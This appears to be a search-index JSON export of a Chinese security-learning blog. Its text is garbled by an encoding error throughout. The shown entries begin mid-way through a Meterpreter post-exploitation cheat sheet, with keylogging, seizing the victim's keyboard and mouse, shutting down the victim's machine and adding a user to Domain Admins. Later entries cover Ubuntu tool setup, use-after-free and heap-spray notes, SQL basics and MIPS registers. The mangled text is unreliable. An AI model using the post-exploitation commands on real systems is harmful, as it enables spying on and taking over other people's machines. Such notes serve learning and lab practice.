portfwdï¼šç½‘ç»œå‘½ä»¤åˆ™æœ‰åˆ—å‡ºipä¿¡æ¯(ipconfig),å±•ç¤ºä¿®æ”¹è·¯ç”±è¡¨(route),è¿˜æœ‰ç«¯å£è½¬å‘(portfwd)ã€‚ 4.é”®ç›˜ç›‘å¬ keyscan_startï¼šå¼€å¯é”®ç›˜è®°å½•åŠŸèƒ½ keyscan_dumpï¼šæ˜¾ç¤ºæ•æ‰åˆ°çš„é”®ç›˜è®°å½•ä¿¡æ¯ keyscan_stopï¼šåœæ­¢é”®ç›˜è®°å½•åŠŸèƒ½ uictl enable keyboard/mouse â€“æ¥ç®¡ç›®æ ‡ä¸»æœºçš„é”®ç›˜å’Œé¼ æ ‡ã€‚ 5.ç³»ç»Ÿå‘½ä»¤ reboot â€“é‡æ–°å¯åŠ¨å—å®³äººçš„è®¡ç®—æœº reg â€“ä¸å—å®³äººçš„æ³¨å†Œè¡¨è¿›è¡Œäº¤äº’ rev2self â€“å›åˆ°æ§åˆ¶ç›®æ ‡ä¸»æœºçš„åˆå§‹ç”¨æˆ·è´¦æˆ·ä¸‹ shell â€“è·å¾—æ§åˆ¶å°æƒé™ shutdown â€“å…³é—­äº†å—å®³è€…çš„è®¡ç®—æœº sysinfo â€“æŸ¥çœ‹ç›®æ ‡æœºç³»ç»Ÿä¿¡æ¯ï¼Œå¦‚æœºå™¨åï¼Œæ“ä½œç³»ç»Ÿç­‰ add_user username password -h ip â€“åœ¨è¿œç¨‹ç›®æ ‡ä¸»æœºä¸Šæ·»åŠ ä¸€ä¸ªç”¨æˆ· add_group_user â€œDomain Adminsâ€ username -h ip â€“å°†ç”¨æˆ·æ·»åŠ åˆ°ç›®æ ‡ä¸»æœºçš„åŸŸç®¡ç†å‘˜ç»„ä¸­","categories":[],"tags":[{"name":"chrome","slug":"chrome","permalink":"https://sinky.top/tags/chrome/"},{"name":"WEB","slug":"WEB","permalink":"https://sinky.top/tags/WEB/"}]},{"title":"ubuntu16.04é‡è£…ä¹‹å„ç§ç¯å¢ƒæ­å»º","slug":"ubuntué‡è£…ä¹‹å„ç§ç¯å¢ƒæ­å»º","date":"2022-08-09T03:49:00.287Z","updated":"2022-08-09T03:49:10.368Z","comments":true,"path":"2022/08/09/ubuntué‡è£…ä¹‹å„ç§ç¯å¢ƒæ­å»º/","link":"","permalink":"https://sinky.top/2022/08/09/ubuntu%E9%87%8D%E8%A3%85%E4%B9%8B%E5%90%84%E7%A7%8D%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","excerpt":"","text":"ç¯å¢ƒï¼šubuntu16.04 0x00 vmtoolsè§£å†³å‘ç‚¹æœ‰ç‚¹æ— è¯­ï¼Œç¬”è€…è¸©å‘æ— æ•°ï¼Œæ²¡æƒ³åˆ°æœ‰ä¸€å¤©åœ¨é‡è£…vmtoolçš„æ—¶å€™è¿˜èƒ½â€¦â€¦ æ­£å¸¸å®‰è£…vmtoolåä»æ—§æ— æ³•ä¸ä¸»æœºè¿›è¡Œå¤åˆ¶ç²˜è´´ï¼Œå…³æ‰è™šæ‹ŸæœºæŸ¥çœ‹è™šæ‹Ÿæœºè®¾ç½®ã€‚ å»ºç«‹çš„å…±äº«æ–‡ä»¶å¤¹è¦è®¾ç½®å±æ€§ä¸ºå…±äº«å¼ã€‚ æå®Œä¹‹åâ€¦â€¦å°±å¯ä»¥äº†ã€‚ æ­¤å¤„è´´ä¸€ä¸ªè·Ÿæˆ‘ä¸€æ ·çš„æš´èºåšä¸»æ•™ç¨‹ï¼šhttps://blog.csdn.net/zerolity/article/details/81206476 0x01 pwntoolså®‰è£…1.å®‰è£…python2.7å’Œpip sudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential 2.å‡çº§pipï¼šsudo pip install --upgrade pip æ›´æ”¹pipçš„é…ç½®æ–‡ä»¶/usr/bin/pip æ›´æ”¹ä¸ºï¼š 3.å®‰è£…pwntoolsï¼šsudo pip install pwntools æŠ¥é”™è¶…æ—¶ï¼Œæ¢ä¸ªé˜¿é‡Œæºå°±å¥½äº†ã€‚ 3.1 æ›´æ¢é˜¿é‡Œæº 1234sudo sucd /etc/apt #åˆ‡æ¢åˆ°aptæºæ–‡ä»¶mv source.list sources.list_bak #å¤‡ä»½æºæ–‡ä»¶vim sources.list #æ–°å»ºä¸€ä¸ªï¼Œç›´æ¥æŠŠä¸‹é¢çš„å†…å®¹copyè¿›å» copyçš„å†…å®¹ï¼š deb cdrom:[Ubuntu 16.04 LTS _Xenial Xerus_ - Release amd64 (20160420.1)]/ xenial main restricted1234567891011121314151617181920212223242526272829303132333435363738394041424344454647deb-src http://archive.ubuntu.com/ubuntu xenial main restricted #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial universedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates universedeb http://mirrors.aliyun.com/ubuntu/ xenial multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse #Added by software-propertiesdeb http://archive.canonical.com/ubuntu xenial partnerdeb-src http://archive.canonical.com/ubuntu xenial partnerdeb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial-security universedeb http://mirrors.aliyun.com/ubuntu/ xenial-security multiverse```3.2 ä¿å­˜é…ç½®åï¼Œæ›´æ–°é…ç½®ï¼š`sudo apt-get update`ä¹‹åå†é‡æ–°æ­¥éª¤ä¸‰çš„å®‰è£…å‘½ä»¤å³å¯ã€‚4.æµ‹è¯•![æ•è·.PNG](https://i.loli.net/2020/10/10/7wzfu32HFRiCXap.png)æ— æŠ¥é”™ï¼Œè¿”å›äº†'1\\xc0'ï¼ŒæˆåŠŸï¼æ‰€ä»¥ä¸ºå•¥ç¬¬ä¸€æ¬¡è‡ªå·±å»å®‰è£…pwntoolsçš„æ—¶å€™è´¹äº†å¾ˆå¤šåŠ›æ°”å‘¢ï¼Œæ„Ÿè§‰é‚£æ—¶å€™è¸©å‘æ— æ•°åˆ°å´©æºƒâ€¦â€¦# 0x02 GDBåŠä¸‰ä¸ªæ’ä»¶çš„å®‰è£…åœ¨ç»ˆç«¯è¾“å…¥gdbï¼Œå‘ç°ubuntu16è‡ªå¸¦gdbï¼Œé‚£æˆ‘å°±ç›´æ¥å®‰è£…æ’ä»¶å¾—äº†ã€‚* peda:åšé€†å‘ç ´è§£* gefï¼šç”¨äºdebugæœ€å¥½* gdbinitï¼šç®€å•ç‰ˆç”¨gitä¸‹è½½æ’ä»¶ï¼š`git clone https://github.com/gatieme/GdbPlugins.git ~/GdbPlugins`æ²¡æœ‰gitçš„ä¸‹è½½ï¼š`apt-get install git`åœ¨ç›®å½•GdbPluginä¸‹å¯ä»¥çœ‹è§ä¸‰ä¸ªæ’ä»¶ï¼Œæƒ³ç”¨å“ªä¸ªæ’ä»¶å°±å¯ä»¥åœ¨è¯¥ç›®å½•ä¸‹è¾“å…¥å¯¹åº”å‘½ä»¤ï¼š```echo \"source ~/GdbPlugins/peda/peda.py\" &gt; ~/.gdbinit echo \"source ~/GdbPlugins/gef/gef.py\" &gt; ~/.gdbinit echo \"source ~/GdbPlugins/gdbinit/gdbinit\" &gt; ~/.gdbinit 0x03 å®‰è£…checksecclonelink1cd checksec.sh ç›®å½•ä¸‹çš„checksecæœ¬æ¥æƒ³å»ºç«‹ä¸€ä¸ªè½¯é“¾æ¥è¿‡å»/usr/local/biné‡Œï¼Œä½†æ˜¯ä¸€ç›´æ‰“ä¸å¼€ï¼Œäºæ˜¯ç›´æ¥ç”¨cpå‘½ä»¤æŠŠchecksecæ‹·è´è¿‡å»äº†ã€‚åœ¨/usr/local/binèƒ½å¤Ÿæ‰“å¼€checksecï¼Œæ‰ç®—æˆåŠŸã€‚ 0x04 å®‰è£…docker+pikachué¶åœºå®‰è£…docker å…ˆå¸è½½å¯èƒ½å­˜åœ¨çš„æ—§ç‰ˆæœ¬ï¼š $ sudo apt-get remove docker docker-engine docker-ce docker.io æ›´æ–°aptåŒ…ç´¢å¼•: $ sudo apt-get update å®‰è£…ä»¥ä¸‹åŒ…ä»¥ä½¿aptå¯ä»¥é€šè¿‡HTTPSä½¿ç”¨å­˜å‚¨åº“ï¼ˆrepositoryï¼‰: $ sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common æ·»åŠ Dockerå®˜æ–¹çš„GPGå¯†é’¥ï¼š $ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æ¥è®¾ç½®stableå­˜å‚¨åº“ï¼š $ sudo add-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\" å†æ›´æ–°ä¸€ä¸‹aptåŒ…ç´¢å¼•: $ sudo apt-get update å®‰è£…æœ€æ–°ç‰ˆæœ¬çš„Docker CEï¼š$ sudo apt-get install -y docker-ce æŸ¥çœ‹dockeræœåŠ¡æ˜¯å¦å¯åŠ¨ï¼š $ systemctl status docker è‹¥æœªå¯åŠ¨ï¼Œåˆ™å¯åŠ¨dockeræœåŠ¡: $ sudo systemctl start docker ç»å…¸çš„hello worldï¼š $ sudo docker run hello-world å¦‚å›¾è¾“å‡ºåˆ™è¡¨ç¤ºdockerå®‰è£…æˆåŠŸã€‚ pikachué¶åœº","categories":[],"tags":[{"name":"ç¯å¢ƒæ­å»º","slug":"ç¯å¢ƒæ­å»º","permalink":"https://sinky.top/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}]},{"title":"UAFæ¼æ´ç®€å•å­¦ä¹ ","slug":"UAFæ¼æ´ç®€å•å­¦ä¹ ","date":"2022-08-09T03:48:28.169Z","updated":"2022-08-09T03:47:46.734Z","comments":true,"path":"2022/08/09/UAFæ¼æ´ç®€å•å­¦ä¹ /","link":"","permalink":"https://sinky.top/2022/08/09/UAF%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"UAFæ¼æ´æ˜¯ä¸€ç§å†…å­˜ç ´åæ¼æ´ï¼Œé€šå¸¸å­˜åœ¨äºæµè§ˆå™¨ä¸­ã€‚ äº§ç”ŸåŸå› uafæ¼æ´æˆå› ï¼šä¸€å—å †å†…å­˜è¢«é‡Šæ”¾ä¹‹ååˆè¢«ä½¿ç”¨ã€‚å†ä¸€æ¬¡è¢«ä½¿ç”¨æ˜¯æŒ‡ï¼šæŒ‡é’ˆå­˜åœ¨ï¼ˆæ‚¬å‚æŒ‡é’ˆè¢«å¼•ç”¨ï¼‰å¼•ç”¨ç»“æœä¸å¯é¢„æµ‹ã€‚ ç”±äºå¤§å¤šæ•°å †å†…å­˜éƒ½æ˜¯C++å¯¹è±¡ï¼Œæ‰€ä»¥åˆ©ç”¨çš„æ ¸å¿ƒæ€è·¯å³ï¼šåˆ†é…å †å»å å‘ï¼Œå çš„å‘ä¸­åˆè‡ªå·±æ„é€ çš„è™šè¡¨ã€‚ åˆ†ææ–¹å¼åˆ†æuafæ¼æ´çš„è¦ç‚¹åœ¨äºå¼„æ¸…æ¥šå¯¹è±¡æ˜¯åœ¨å“ªé‡Œè¢«åˆ†é…ï¼Œè¢«é‡Šæ”¾ï¼Œè¢«é‡ç”¨ã€‚ uafå¼‚å¸¸è§¦å‘ç‚¹ï¼šå¯¹å·²é‡Šæ”¾çš„å¯¹è±¡è¿›è¡Œæ“ä½œå¯¼è‡´çš„å¼‚å¸¸ï¼Œæ‰€ä»¥å¼‚å¸¸ç‚¹å³é‡ç”¨ç‚¹ã€‚ è€Œç”±äºæ˜¯å¯¹å¯¹è±¡çš„æ“ä½œï¼Œå¯ä»¥åˆ—å‡ºè¿™ä¸ªå¯¹è±¡çš„æ‰€æœ‰æ–¹æ³•ï¼Œæ‰¾å‡ºåˆ†é…å’Œé‡Šæ”¾çš„æ–¹æ³•ï¼Œå¯¹å…¶ä¸‹æ–­æ¥åˆ†æuafè¿‡ç¨‹ã€‚ 1.æ‚¬å‚æŒ‡é’ˆï¼šæŒ‡ä¸€ç±»ä¸æŒ‡å‘ä»»ä½•åˆæ³•çš„æˆ–è€…æœ‰æ•ˆçš„ï¼ˆå³ä¸æŒ‡é’ˆçš„å«ä¹‰ä¸ç¬¦ï¼‰çš„å¯¹è±¡çš„æŒ‡é’ˆï¼Œæ¯”å¦‚ä¸€ä¸ªå¯¹è±¡çš„æŒ‡é’ˆï¼Œå¦‚æœè¿™ä¸ªå¯¹è±¡å·²ç»è¢«é‡Šæ”¾æˆ–è€…å›æ”¶ï¼Œä½†æ˜¯æŒ‡é’ˆæ²¡æœ‰è¿›è¡Œä»»ä½•çš„ä¿®æ”¹ï¼Œä»ç„¶æ‰§è¡Œå·²è¢«é‡Šæ”¾çš„å†…å­˜ï¼Œè¿™ä¸ªæŒ‡é’ˆå°±å«åšæ‚¬å‚æŒ‡é’ˆã€‚ 2.UAFæ¼æ´ï¼šUse-AFTER-Freeæ˜¯ä¸€ç§å†…å­˜ç ´åæ¼æ´ï¼Œç®€å•æ¥è¯´ï¼Œæ¼æ´çš„åŸå› æ˜¯ä½¿ç”¨äº†æ‚¬å‚æŒ‡é’ˆã€‚ å¸¸è§ä¸UAFæ¼æ´é…åˆä½¿ç”¨çš„æ˜¯å †å–·å°„ï¼Œåˆ†é…å¤§é‡å†…å­˜ï¼Œå¢å¤§é¶å­çš„é¢ç§¯ï¼Œä½¿eipè·³è¿›åˆ†é…çš„å†…å­˜ä¸­ï¼Œè€Œåˆ†é…çš„å†…å­˜ä¸­åˆå……æ»¡äº†æ»‘æ¿æŒ‡ä»¤ï¼Œåªè¦å‘½ä¸­äº†æ»‘æ¿æŒ‡ä»¤å°±å¯ä»¥å‘½ä¸­shellcode è°ƒè¯•æ–¹å¼å¯¹äºuafæ¼æ´ï¼Œè°ƒè¯•å™¨æ•è·åˆ°çš„å¼‚å¸¸å¹¶ä¸æ˜¯æ¼æ´å‘ç”Ÿçš„ç¬¬ä¸€ç°åœºï¼Œæ‰€ä»¥ä¸€èˆ¬è¦ä½¿ç”¨gflagså¼€å¯PageHeapå’ŒUSTï¼ˆwindbgè‡ªå¸¦gflagså·¥å…·ï¼‰ gflags.exe /i ç¨‹åºå.exe +hpa +ust è¿™æ ·è°ƒè¯•å™¨ä¼šå®šä½åˆ°æœ€å…ˆå‡ºé”™çš„ä½ç½®ã€‚ æŠ€å·§ï¼š1.åœ¨idaä¸­æŸ¥æ‰¾å‡½æ•°åï¼Œåœ¨windbgä¸‹æ–­2.æ‰“å¼€pocæ–‡ä»¶åå‡ºç°crashå°±æ˜¯å¯¹è±¡è¢«é‡ç”¨ï¼Œæ ¹æ®crashåœ°å€æ¥æ‰¾åˆ°é‡ç”¨çš„å¯¹è±¡èµ·å§‹åœ°å€3.å¯¹å¯¹è±¡èµ·å§‹ä½¿ç”¨ !heap -p -a åœ°å€ å¯è·å¾—è¿™ä¸ªå¯¹è±¡çš„åˆ†é…ä¿¡æ¯ï¼Œç”±å›æº¯è¿˜å¯ä»¥çŸ¥é“æ˜¯ä»€ä¹ˆå‡½æ•°åˆ†é…çš„ã€‚4.å¯¹åˆ†é…å‡½æ•°ä¸‹æ–­åˆ°è¾¾åˆ†é…ç°åœº5.åœ¨å›æº¯ä¸­ï¼Œåˆ†é…å‡½æ•°ä¸€èˆ¬ä¸ºRtlAllocateHeapçš„ä¸Šå±‚ï¼Œè€Œé‡Šæ”¾å‡½æ•°ä¸€èˆ¬å°±æ˜¯FreeHeapçš„ä¸Šå±‚ã€‚","categories":[],"tags":[{"name":"chrome","slug":"chrome","permalink":"https://sinky.top/tags/chrome/"}]},{"title":"SQLå­¦ä¹ ä¸æ•´ç†","slug":"SQLå­¦ä¹ ä¸æ•´ç†","date":"2022-08-09T03:47:09.145Z","updated":"2022-08-09T03:45:51.854Z","comments":true,"path":"2022/08/09/SQLå­¦ä¹ ä¸æ•´ç†/","link":"","permalink":"https://sinky.top/2022/08/09/SQL%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%95%B4%E7%90%86/","excerpt":"","text":"0x01 SQLç®€ä»‹SQLï¼ˆç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€ï¼‰ç”¨äºè®¿é—®å’Œæ“ä½œæ•°æ®åº“ä¸­çš„æ•°æ®çš„æ ‡å‡†æ•°æ®åº“ç¼–ç¨‹è¯­è¨€ã€‚ SQLæ˜¯å…³ç³»æ•°æ®åº“ç³»ç»Ÿçš„æ ‡å‡†è¯­è¨€ï¼Œæ˜¯ä¸€ç§ANSIæ ‡å‡†çš„è®¡ç®—æœºè¯­è¨€ã€‚ è¦åˆ›å»ºä¸€ä¸ªæ˜¾ç¤ºæ•°æ®åº“ä¸­çš„æ•°æ®çš„ç½‘ç«™ï¼Œéœ€è¦ï¼š ä¸€ä¸ªRDBMSæ•°æ®åº“ç¨‹åºï¼ˆMS Access SQL Server MySQLï¼‰ ä½¿ç”¨æœåŠ¡å™¨ç«¯è„šæœ¬è¯­è¨€ï¼ˆPHP ASPï¼‰ ä½¿ç”¨SQLæ¥è·å–æ‰€éœ€çš„æ•°æ® ä½¿ç”¨HTML/CSSæ¥è®¾ç½®é¡µé¢çš„æ ·å¼ 0x02 SQL RDBMSæ¦‚å¿µRDBMSæ˜¯å…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„ç¼©å†™ï¼Œæ˜¯SQLçš„åŸºç¡€ã€‚ ä»€ä¹ˆæ˜¯è¡¨RDBMSä¸­çš„æ•°æ®å­˜å‚¨åœ¨æˆä¸ºè¡¨çš„æ•°æ®åº“å¯¹è±¡ä¸­ï¼Œè¿™ä¸ªè¡¨åŸºæœ¬ä¸Šæ˜¯ä¸€ä¸ªç›¸å…³æ•°æ®æ¡ç›®çš„é›†åˆï¼Œç”±è®¸å¤šåˆ—å’Œè¡Œç»„æˆï¼Œè¡¨æ˜¯å…³ç³»æ•°æ®åº“ä¸­æœ€å¸¸è§å’Œæœ€ç®€å•çš„æ•°æ®å­˜å‚¨å½¢å¼ã€‚ ä»€ä¹ˆæ˜¯å­—æ®µæ¯ä¸ªè¡¨éƒ½è¢«åˆ†è§£æˆæ›´å°çš„å®ä½“ï¼Œæˆä¸ºå­—æ®µï¼ŒCustomersè¡¨ä¸­çš„å­—æ®µç”±IDã€å§“åã€å¹´é¾„ã€åœ°å€å’Œè–ªèµ„ç»„æˆã€‚ å­—æ®µæ˜¯è¡¨ä¸­çš„åˆ—ï¼Œç”¨äºç»´æŠ¤æœ‰å…³è¡¨ä¸­æ¯æ¡è®°å½•çš„ç‰¹å®šä¿¡æ¯ã€‚ ä»€ä¹ˆæ˜¯è®°å½•æˆ–è€…è¡Œæ•°æ®è®°å½•ä¹Ÿæˆä¸ºæ•°æ®è¡Œï¼Œå³è¡¨ä¸­å­˜åœ¨çš„æ¯ä¸ªå•ç‹¬çš„æ¡ç›®ã€‚ è®°å½•æ˜¯è¡¨ä¸­çš„æ°´å¹³å®ä½“ã€‚ ä»€ä¹ˆæ˜¯åˆ—ï¼Ÿåˆ—æ˜¯è¡¨å½°çš„å‚ç›´å®ä½“ï¼Œå…¶ä¸­åŒ…å«ä¸è¡¨ä¸­ç‰¹å®šå­—æ®µå…³è”çš„æ‰€æœ‰ä¿¡æ¯ã€‚ ä»€ä¹ˆæ˜¯ç©ºå€¼è¡¨ä¸­çš„ç©ºå€¼æ˜¯æ˜¾ç¤ºä¸ºç©ºçš„å­—æ®µä¸­çš„å€¼ï¼Œè¿™æ„å‘³ä¸­å…·æœ‰ç©ºå€¼çš„å­—æ®µæ˜¯æ²¡æœ‰å€¼çš„å­—æ®µã€‚ SQLçº¦æŸçº¦æŸæ˜¯åœ¨è¡¨ä¸Šçš„æ•°æ®åˆ—ä¸Šå¼ºåˆ¶æ‰§è¡Œçš„è§„åˆ™ï¼Œç”¨äºé™åˆ¶å¯ä»¥è¿›å…¥è¡¨ä¸­çš„æ•°æ®ç±»å‹ï¼Œè¿™ç¡®ä¿äº†æ•°æ®åº“ä¸­æ•°æ®çš„å‡†ç¡®æ€§å’Œå¯é æ€§ã€‚çº¦æŸå¯ä»¥æ˜¯åˆ—çº§åˆ«ï¼Œä¹Ÿå¯ä»¥æ˜¯è¡¨çº§åˆ«ï¼Œåˆ—çº§çº¦æŸä»…åº”ç”¨äºä¸€åˆ—ï¼Œè€Œè¡¨çº§çº¦æŸåˆ™åº”ç”¨äºæ•´ä¸ªè¡¨ã€‚ NOT NULLçº¦æŸï¼šä¿åˆ—ä¸­æ•°æ®ä¸èƒ½æœ‰NULLå€¼ã€‚ DEFAULTçº¦æŸï¼šæä¾›è¯¥åˆ—æ•°æ®æœªæŒ‡å®šæ—¶æ‰€é‡‡ç”¨çš„é»˜è®¤å€¼ã€‚ UNIQUEçº¦æŸï¼šä¿è¯åˆ—ä¸­çš„æ‰€æœ‰æ•°æ®å„ä¸ç›¸åŒã€‚ ä¸»é”®çº¦æŸï¼šå”¯ä¸€æ ‡è¯†æ•°æ®è¡¨ä¸­çš„è¡Œ/è®°å½• å¤–é”®çº¦æŸï¼šå”¯ä¸€æ ‡è¯†å…¶ä»–è¡¨ä¸­çš„ä¸€æ¡è¡Œ/è®°å½• CHECKçº¦æŸï¼šæ­¤çº¦æŸä¿è¯åˆ—ä¸­çš„æ‰€æœ‰å€¼æ»¡è¶³æŸä¸€æ¡ä»¶ ç´¢å¼•ï¼šç”¨äºåœ¨æ•°æ®åº“ä¸­å¿«é€Ÿåˆ›å»ºæˆ–æ£€ç´¢æ•°æ® çº¦æŸå¯ä»¥åœ¨åˆ›å»ºè¡¨æ—¶è§„å®šï¼ˆé€šè¿‡CREATE TABLEè¯­å¥ï¼‰æˆ–è€…åœ¨è¡¨åˆ›å»ºå‡å€¼åè§„å®šï¼ˆé€šè¿‡ALTER TABLEè¯­å¥ï¼‰ã€‚ æ•°æ®å®Œæ•´æ€§æ¯ä¸ªå…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿéƒ½å­˜åœ¨ä»¥ä¸‹ç±»å‹çš„æ•°æ®å®Œæ•´æ€§ï¼š å®ä½“å®Œæ•´æ€§-è¡¨ä¸­æ— é‡å¤è¡Œ åŸŸå®Œæ•´æ€§-é€šè¿‡é™åˆ¶å€¼çš„ç±»å‹ï¼Œæ ¼å¼æˆ–èŒƒå›´æ¥å¼ºåˆ¶æ‰§è¡Œç»™å®šåˆ—çš„æœ‰æ•ˆæ¡ç›® å¼•ç”¨å®Œæ•´æ€§-ä¸èƒ½åˆ é™¤å…¶ä»–è®°å½•ä½¿ç”¨çš„è¡Œã€‚ ç”¨æˆ·å®šä¹‰çš„å®Œæ•´æ€§-å¼ºåˆ¶æ‰§è¡Œä¸€äº›ä¸å±äºå®ä½“ã€åŸŸæˆ–å¼•ç”¨å®Œæ•´æ€§çš„ç‰¹å®šä¸šåŠ¡è§„åˆ™ã€‚ æ•°æ®åº“è§„èŒƒåŒ–æ•°æ®åº“è§„èŒƒåŒ–æ˜¯åœ¨æ•°æ®åº“ä¸­æœ‰æ•ˆçš„ç»„ç»‡æ•°æ®çš„è¿‡ç¨‹ï¼Œè¿™ä¸ªè§„èŒƒåŒ–è¿‡ç¨‹æœ‰ä¸¤ä¸ªåŸå› ï¼š æ¶ˆé™¤å¤šä½™æ•°æ® ç¡®ä¿æ•°æ®ä¾èµ–å…³ç³»æ˜¯æœ‰æ„ä¹‰çš„ è§„èŒƒåŒ–æŒ‡å¯¼åŸåˆ™ç§°ä¸ºèŒƒå¼ï¼ŒèŒƒå¼çš„ç›®çš„æ˜¯ç»„ç»‡æ•°æ®åº“ç»“æ„ï¼Œä½¿å…¶ç¬¦åˆç¬¬ä¸€èŒƒå¼ã€ç¬¬äºŒèŒƒå¼å’Œç¬¬ä¸‰èŒƒå¼çš„è§„åˆ™ã€‚ 0x03 SQLè¯­æ³•SQLè¯­æ³•è§„åˆ™ SQLè¯­å¥æ€»æ˜¯ä»¥å…³é”®å­—å¼€å§‹ï¼Œå¦‚SELECTã€INSERTã€UPDATEã€DELETEã€DROPã€CREATE. SQLè¯­å¥ä»¥åˆ†å·ç»“å°¾ SQLä¸åŒºåˆ†å¤§å°å†™ã€‚ æ•°æ®åº“è¡¨æ•°æ®åº“é€šå¸¸åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªè¡¨ï¼Œæ¯ä¸ªè¡¨éƒ½ç”¨ä¸€ä¸ªåç§°æ ‡è¯†ï¼Œè¯¥è¡¨åŒ…å«å¸¦æœ‰æ•°æ®çš„è®°å½•ã€‚ SQLè¯­å¥SELECT * FROM Customers; ä¸€äº›é‡è¦çš„SQLå‘½ä»¤ SELECTï¼šä»æ•°æ®åº“ä¸­æå–æ•°æ® UPDATEï¼šæ›´æ–°æ•°æ®åº“ä¸­çš„æ•°æ® DALETEï¼šä»æ•°æ®åº“ä¸­åˆ é™¤æ•°æ® INSERT INTOï¼šå‘æ•°æ®åº“ä¸­æ’å…¥æ–°æ•°æ® CREATE DATABASEï¼šåˆ›å»ºæ–°æ•°æ®åº“ ALTER DATABASE:ä¿®æ”¹æ•°æ®åº“ CREATE TABLEï¼šåˆ›å»ºæ•°æ®åº“ ALTER TABLE:å˜æ›´æ•°æ®åº“è¡¨ DROP TABLE:åˆ é™¤è¡¨ CREATE INDEXï¼šåˆ›å»ºç´¢å¼• DROP INDEXï¼šåˆ é™¤ç´¢å¼• SELECT:SELECT column_name(s) FROM table_name SELECTè¯­å¥å’ŒWHEREå­å¥ï¼šSELECT [*] FROM [TableName] WHERE [condition] SELECTè¯­å¥å’ŒWHEREå’Œ/æˆ–å­å¥ï¼šSELECT [*] FROM [TableName] WHERE [condition1] [AND [or]] [condition2]... SELECTè¯­å¥ä¸ORDER BY: SELECT column_name() FROM table_name ORDER BY column_name() ASC or DESC SELECT DISTINCTï¼ˆåŒºåˆ†ï¼‰å­å¥ï¼š SELECT DISTINCT column1,...columnN FROM table_name; SELECT INå­å¥ï¼š SELECT column1,column2...columnN FROM table_name WHERE column_name IN (val-1,val-2,...val-N); SELECT LIKE(ç±»)å­å¥ï¼š SELECT column1,column2...columnN FROM table_name WHERE column_name LIKE {PATTERN}; SELECT COUNTï¼ˆè®¡æ•°ï¼‰å­å¥ï¼š SELECT COUNT(column_name) FROM table_name WHERE CONDITION; SELECTä¸HAVINGå­å¥ï¼š SELECT SUM(column_name) FROM table_name WHERE CONDITION GROUP BY column_name HAVING (arithematic function condition); INSERT INTOè¯­å¥ï¼š INSERT INTO table_name(column1,column2,column3,...) VALUES (value,value1,value2,value3...) UPDATEè¯­å¥ï¼š UPDATE table_name SET column=value,column1=value1 WHERE someColumn=someValue DELETEè¯­å¥ï¼š DELETE FROM tableName WHERE someColumn=someValue CREATEè¯­å¥ï¼š CREATE TABLE table_name(column1 datatype,column2 datatype,column3 datatype,...columnN datatype,PRIMARY KEY(one or moe columns )); DROPè¯­å¥ï¼š DROP TABLE table_name; DROP INDEXè¯­å¥ï¼š AL TER TABLE table_name DROP INDEX index_name; DESCè¯­å¥ï¼š DESC table_name; TRUNCATEæˆªæ–­è¡¨è¯­å¥ï¼š TRUNCATE TABLE table_name; ALTER TABLEè¯­å¥ï¼š ALTER TABLE table_name{ADD|DROP|MODIFY} column_name {data_type}; ALTER TABLE(å¯¹è¡¨åé‡å‘½å) ALTER TABLE table_name RENAME TO new_table_name; USEè¯­å¥ï¼š USE database_name; COMMITè¯­å¥ï¼š COMMIT; ROLLBACKè¯­å¥ï¼š ROLLBACK; 0x04 SQLé€‰æ‹©","categories":[],"tags":[{"name":"å­¦ä¹ è®°å½•","slug":"å­¦ä¹ è®°å½•","permalink":"https://sinky.top/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"}]},{"title":"MIPSæ¶æ„å­¦ä¹ ç¬”è®°","slug":"MIPSæ¶æ„å­¦ä¹ ç¬”è®°","date":"2022-08-09T03:42:43.325Z","updated":"2022-08-09T03:42:07.688Z","comments":true,"path":"2022/08/09/MIPSæ¶æ„å­¦ä¹ ç¬”è®°/","link":"","permalink":"https://sinky.top/2022/08/09/MIPS%E6%9E%B6%E6%9E%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"0x01 å¯„å­˜å™¨32ä¸ªé€šç”¨å¯„å­˜å™¨ï¼š$0-$31,32ä½MIPS32ä¸­é€šç”¨å¯„å­˜å™¨çš„çº¦å®šç”¨æ³•ï¼š |:â€“:|:â€“:||å¯„å­˜å™¨åå­—|çº¦å®šåå­—|ç”¨é€”||$0|zero|æ€»æ˜¯ä¸º0||$1|at|ç•™ä½œæ±‡ç¼–å™¨ç”Ÿæˆä¸€äº›åˆæˆæŒ‡ä»¤||$2 $3|v0 v1|ç”¨æ¥å­˜æ”¾å­ç¨‹åºè¿”å›å€¼||$4$7|a0a3|è°ƒç”¨å­ç¨‹åºæ—¶ï¼Œä½¿ç”¨è¿™4ä¸ªå¯„å­˜å™¨ä¼ 